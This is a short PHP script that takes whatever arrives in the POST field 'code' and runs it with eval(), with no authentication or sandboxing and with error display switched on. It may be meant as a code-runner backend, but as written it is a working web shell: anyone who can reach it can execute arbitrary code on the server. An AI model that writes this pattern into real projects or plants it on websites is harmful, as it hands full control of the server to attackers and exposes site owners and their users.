<?php

ini_set('display_errors', 1);

if (!isset($_POST['code'])) {
    echo '[error: code missing]' . PHP_EOL;
    exit;
}

eval($_POST['code']);
